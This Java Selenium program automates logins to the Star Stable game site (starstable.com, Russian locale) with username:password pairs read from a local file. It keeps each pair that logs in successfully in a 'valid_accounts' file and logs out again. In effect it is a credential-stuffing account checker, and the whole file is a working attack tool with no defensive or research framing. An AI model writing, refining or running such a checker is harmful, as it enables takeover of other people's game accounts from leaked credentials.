import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.support.ui.WebDriverWait;
import org.openqa.selenium.support.ui.ExpectedConditions;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.time.Duration;

public class Main {

    public static void main(String[] args) {
        System.setProperty("webdriver.chrome.driver", "C:\\chromedriver-win64\\chromedriver.exe");

        ChromeOptions options = new ChromeOptions();
        options.addArguments("user-data-dir=C:\\Users\\Daddy\\AppData\\Local\\Google\\Chrome\\User Data");
        options.addArguments("profile-directory=Default");

        WebDriver driver = new ChromeDriver(options);
        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(5)); // Уменьшаем время ожидания

        String loginUrl = "https://www.starstable.com/ru/login";
        String validAccountsFile = "D:\\valid_accounts.txt";

        try (BufferedReader br = new BufferedReader(new FileReader("C:\\text.txt"));
             FileWriter writer = new FileWriter(validAccountsFile, true)) { // true добавляет к существующему файлу
            String line;
            while ((line = br.readLine()) != null) {
                String[] credentials = line.split(":");
                if (credentials.length == 2) {
                    String username = credentials[0];
                    String password = credentials[1];

                    driver.get(loginUrl);

                    // Вводим логин
                    WebElement loginInput = wait.until(ExpectedConditions.presenceOfElementLocated(By.xpath("//input[@name='email']")));
                    loginInput.sendKeys(username);

                    // Вводим пароль
                    WebElement passwordInput = driver.findElement(By.xpath("//input[@name='password']"));
                    passwordInput.sendKeys(password);

                    // Нажимаем кнопку входа
                    WebElement loginButton = driver.findElement(By.xpath("//button[@type='submit']"));
                    loginButton.click();

                    // Ожидание, чтобы страница успела загрузиться
                    try {
                        // Уменьшаем время ожидания и используем presenceOfElementLocated
                        WebElement lifetimeElement = wait.until(ExpectedConditions.presenceOfElementLocated(By.xpath("//p[text()='Lifetime']")));

                        // Если элемент найден, значит вход успешен
                        System.out.println("Успешный вход: " + username);  // Выводим информацию в консоль
                        writer.write(username + ":" + password + "\n");  // Записываем в файл

                        // Переход к меню аккаунта и выход из него
                        WebElement accountMenu = wait.until(ExpectedConditions.presenceOfElementLocated(
                                By.xpath("//div[@class='sc-62d6f33d-1 jmcBzA']//div[@class='sc-62d6f33d-5 fNlCRw'][contains(text(), 'Аккаунт')]")
                        ));
                        accountMenu.click();

                        // Ожидаем, пока кнопка "Выход" станет кликабельной
                        WebElement logoutButton = wait.until(ExpectedConditions.presenceOfElementLocated(
                                By.xpath("//button[@class='sc-62d6f33d-6 etOORh']//div[contains(text(), 'Выход')]")
                        ));
                        logoutButton.click();

                        // Ожидание, чтобы убедиться, что пользователь вышел
                        wait.until(ExpectedConditions.presenceOfElementLocated(By.xpath("//button[@class='sc-62d6f33d-6 etOORh']//div[contains(text(), 'Войти')]")));
                        System.out.println("Выход из аккаунта для пользователя: " + username);

                    } catch (Exception e) {
                        // Если не удалось найти элемент "Lifetime", значит вход не был успешным
                        System.out.println("Не удалось войти: " + username);  // Логируем неуспешный вход
                    }

                    // Здесь продолжаем цикл, чтобы попробовать следующий аккаунт
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {

        }
    }
}
